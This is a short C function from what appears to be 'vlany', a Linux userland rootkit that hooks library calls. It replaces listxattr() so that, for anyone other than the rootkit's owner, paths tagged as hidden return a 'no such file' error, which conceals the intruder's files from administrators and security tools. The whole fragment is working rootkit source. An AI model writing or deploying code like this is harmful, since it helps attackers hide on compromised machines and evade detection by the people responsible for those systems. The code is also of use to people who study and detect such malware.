ssize_t listxattr(const char *path, char *list, size_t size)
{
    #ifdef DEBUG
        printf("[vlany] listxattr() called\n");
    #endif

    HOOK(old_listxattr, CLISTXATTR);

    if(owned()) return old_listxattr(path, list, size);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_listxattr(path, list, size);
}
